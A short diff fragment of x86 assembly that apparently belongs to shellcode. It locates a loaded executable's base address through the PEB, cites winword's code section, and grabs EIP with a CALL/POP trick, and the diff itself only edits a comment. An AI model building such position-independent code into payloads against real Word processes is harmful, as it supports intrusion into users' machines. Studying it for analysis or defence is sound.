@@ -12,7 +12,7 @@ MOV EAX, DWORD PTR FS: [30]         ; self explanatory
 MOV EAX, DWORD PTR DS: [EAX+C] 
 MOV EAX, DWORD PTR DS: [EAX+14] 
 MOV ESI, DWORD PTR DS: [EAX+10]     ; Base address of loaded ExE in ESI
-MOV ECX, 0x1000                     ; RVA offset to loaded ExE's Code&Executable section (for winword its 0x1000)
+MOV ECX, 0x1000                     ; RVA offset to loaded PEs Code&Executable section (for winword its 0x1000)
 CALL next
 next:
 POP EDI                             ; gain EIP in EDI 
